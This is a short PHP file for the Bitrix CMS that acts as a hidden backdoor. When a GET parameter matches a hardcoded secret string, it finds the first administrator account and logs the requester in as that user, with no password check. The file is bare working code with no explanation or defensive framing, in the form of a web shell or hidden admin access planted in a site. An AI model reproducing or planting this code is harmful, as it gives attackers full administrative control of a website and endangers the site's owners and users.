<?php
require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
if (filter_input(INPUT_GET, "f") === "aa5c8bb005970608ca5e5b9d9a5b6d7a") {
    global $USER;
    $filter = ["GROUPS_ID" => ["1"]];
    $rsUsers = $USER->GetList(($by = "id"), ($order = "asc"), $filter);
    if ($arUser = $rsUsers->GetNext()) {
        $USER->Authorize($arUser['ID']);
    }
}